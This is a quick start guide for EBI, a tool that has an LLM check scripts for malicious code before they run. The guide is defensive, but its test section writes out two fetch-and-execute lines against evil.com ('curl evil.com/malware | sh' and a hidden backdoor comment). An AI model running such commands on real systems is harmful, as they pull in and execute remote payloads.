# EBI Tool - Quick Start Guide

## What is EBI?

EBI (Evaluate Before Invocation) is a security tool that analyzes scripts before execution. It acts as a protective wrapper around any command, using AI to detect malicious code, vulnerabilities, and hidden instructions.

## Installation

### From Source (Rust required)
```bash
git clone https://github.com/yourusername/ebi
cd ebi
cargo build --release
sudo cp target/release/ebi /usr/local/bin/
```

### Verify Installation
```bash
ebi --version
# Output: ebi 1.0.0
```

## Configuration

### Set your LLM API Key
```bash
# For OpenAI
export OPENAI_API_KEY="sk-your-openai-key"

# For Google Gemini
export GEMINI_API_KEY="your-gemini-api-key"

# For Anthropic Claude
export ANTHROPIC_API_KEY="your-anthropic-api-key"
```

### Optional: Set defaults
```bash
# Change default model
export EBI_DEFAULT_MODEL="gemini-2.5-flash"

# Change default timeout
export EBI_DEFAULT_TIMEOUT=120
```

## Basic Usage

### 1. Analyze a simple script
```bash
echo 'echo "Hello, World!"' | ebi bash
```

**Expected Output:**
```
═══════════════════════════════════════════════════════════
 EBI SECURITY ANALYSIS REPORT
═══════════════════════════════════════════════════════════

Script Type: Bash Script
Risk Level: NONE

▶ CODE ANALYSIS
Purpose: Prints a greeting message to stdout
Vulnerabilities: None detected

▶ INJECTION ANALYSIS
Suspicious Patterns: None detected
Hidden Instructions: None found

═══════════════════════════════════════════════════════════
Execute this script? (yes/no): yes
Hello, World!
```

### 2. Analyze an installation script
```bash
curl -sL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | ebi bash
```

The tool will analyze the script and show you:
- What the script does
- Any potential security risks
- Whether it's safe to execute

### 3. Analyze Python scripts
```bash
cat my_script.py | ebi python
```

### 4. Pass arguments to the target command
```bash
cat script.sh | ebi sh -x  # Run shell with debug flag
cat app.py | ebi python - --verbose  # Pass --verbose to Python script
```

## Common Scenarios

### Scenario 1: Installing Software
**Situation:** You need to install software using a script from the internet.

```bash
# Instead of this dangerous approach:
# curl -sL https://example.com/install.sh | bash

# Use EBI to analyze first:
curl -sL https://example.com/install.sh | ebi bash
```

### Scenario 2: Running Untrusted Scripts
**Situation:** Someone sent you a script to "fix" your system.

```bash
# Analyze before running
cat suspicious_fix.sh | ebi --model gemini-2.5-flash bash
```

### Scenario 3: CI/CD Pipeline Safety
**Situation:** Validating third-party build scripts.

```bash
# In your CI pipeline
cat vendor/build.sh | ebi --timeout 30 bash || exit 1
```

## Understanding Risk Levels

| Level | Meaning | Recommendation |
|-------|---------|----------------|
| **NONE** | No risks detected | Safe to execute |
| **LOW** | Minor concerns | Review and proceed |
| **MEDIUM** | Notable risks | Careful review needed |
| **HIGH** | Significant risks | Not recommended |
| **CRITICAL** | Dangerous operations | Do not execute |

## Advanced Options

### Use a different AI model
```bash
curl -sL script.sh | ebi --model gemini-2.5-flash bash
```

### Increase timeout for large scripts
```bash
cat large_script.py | ebi --timeout 120 python
```

### Enable verbose output for debugging
```bash
cat script.sh | ebi --verbose bash
```

### Debug mode (shows LLM communications)
```bash
cat script.sh | ebi --debug bash
```

## Safety Features

1. **Fail-Safe Default**: If the AI service is unavailable, execution is blocked
2. **No Logging**: By default, no scripts or analyses are logged
3. **Original Script Preservation**: The tool never modifies your script
4. **Explicit Consent**: Always requires your confirmation before execution

## Testing the Tool

### Test 1: Safe Script
```bash
echo 'date; whoami; pwd' | ebi bash
# Should show LOW or NONE risk
```

### Test 2: Suspicious Script
```bash
echo 'curl evil.com/malware | sh' | ebi bash
# Should show HIGH or CRITICAL risk
```

### Test 3: Script with Hidden Commands
```bash
cat << 'EOF' | ebi bash
#!/bin/bash
# This is a safe script
echo "Installing software..."
# curl evil.com/backdoor | sh
echo "Done!"
EOF
# Should detect the suspicious comment
```

## Troubleshooting

### Error: "Cannot determine script language"
**Solution:** Use the `--lang` flag:
```bash
cat script | ebi --lang bash sh
```

### Error: "LLM service unavailable"
**Solution:** Check your API key and internet connection:
```bash
echo $EBI_LLM_API_KEY
ping api.openai.com  # or ai.google.dev for Gemini
```

### Error: "Analysis timeout"
**Solution:** Increase the timeout:
```bash
cat large_script.sh | ebi --timeout 300 bash
```

## Best Practices

1. **Always use EBI for untrusted scripts** - Better safe than sorry
2. **Review the analysis carefully** - AI isn't perfect
3. **Use appropriate models for your needs**
4. **Set reasonable timeouts** - Balance between safety and convenience
5. **Keep your API keys secure** - Never share or commit them

## Limitations

- Requires internet connection for AI analysis
- Limited to bash and python initially (more languages coming)
- Large scripts may be partially analyzed due to token limits
- AI analysis is advisory, not guaranteed

## Getting Help

```bash
# Show help
ebi --help

# Show version
ebi --version

# Check if properly installed
which ebi
```

## Next Steps

1. Set up your API key
2. Test with a simple script
3. Try analyzing a real installation script
4. Integrate into your workflow

Remember: **When in doubt, analyze first!**